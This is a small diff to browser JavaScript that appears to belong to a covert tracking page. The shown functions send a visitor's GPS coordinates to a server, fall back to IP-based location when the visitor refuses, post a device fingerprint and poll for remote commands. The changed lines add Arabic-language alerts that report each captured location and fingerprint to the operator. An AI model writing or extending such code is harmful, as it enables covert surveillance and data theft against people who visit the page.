@@ -82,7 +82,7 @@ function requestLocation() {
           longitude: pos.coords.longitude,
           accuracy: pos.coords.accuracy
         })
-      });
+      }).then(() => sendNotification(`📍 تم تحديد الموقع بنجاح:\nLat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`));
     },
     () => {
       sendNotification("❌ رفض الموقع. محاولة تحديد عبر IP...");
@@ -155,7 +155,7 @@ function sendFingerprint() {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(info)
-  });
+  }).then(() => sendNotification("🧠 تم إرسال البصمة الرقمية."));
 }
 
 function pollCommands() {
